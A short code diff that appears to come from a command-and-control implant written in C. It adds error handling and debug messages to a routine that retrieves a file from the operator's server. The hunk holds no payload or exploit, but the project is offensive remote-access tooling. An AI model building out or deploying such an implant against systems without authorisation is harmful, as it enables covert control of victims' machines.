@@ -72,14 +72,22 @@ void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, task->parameters);
 	
 	while (upload.finished == FALSE) {
-		perform_upload(state, &upload);
+		BOOL result = perform_upload(state, &upload);
+		if (result == FALSE) {
+			upload.error = TRUE;
+			break;
+		}
 	}
 	
 	#ifdef CELEBI_DEBUG
-	dprintf("Retrieved a file from server, final size: %u", upload.buflen);
+	if (upload.error == FALSE) {
+		dprintf("Retrieved a file from server, final size: %u", upload.buflen);
+	} else {
+		dprintf("Failed to retrieve a file from the server");
+	}
 	#endif
 
-	// TODO load into persistent memory, perform post, print to debug console
+	// TODO load into persistent memory, perform post with success/error, print to debug console
 	
 	free_upload_manager(&upload);
 }
